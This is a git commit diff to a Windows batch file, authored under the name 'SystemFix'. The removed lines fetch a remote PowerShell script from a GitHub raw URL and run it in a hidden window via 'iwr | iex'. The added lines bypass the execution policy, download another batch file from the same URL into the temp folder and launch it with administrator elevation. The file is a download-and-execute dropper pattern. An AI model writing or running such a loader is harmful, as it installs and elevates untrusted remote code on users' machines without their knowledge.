1324afcf200f9946cd363ad3ffd87dea34cd938f
SystemFix <ab7132311@gmail.com>
2025-01-08 01:19:52 +0500

    Update a.bat

--- a.bat
+++ a.bat
@@ -1,7 +1,7 @@
 @echo off
+
 powershell -NoProfile -Command "Set-ExecutionPolicy Bypass -Scope Process -Force"
 
-powershell -NoProfile -WindowStyle Hidden -Command "iwr 'https://raw.githubusercontent.com/cqdll/-/main/a.ps1' -UseBasicParsing | iex"
+powershell -NoProfile -Command "iwr 'https://raw.githubusercontent.com/cqdll/-/main/a.bat' -OutFile \"%TEMP%\a.bat\" -UseBasicParsing"
 
-echo
-pause
+powershell -NoProfile -Command "Start-Process \"%TEMP%\a.bat\" -Verb RunAs"
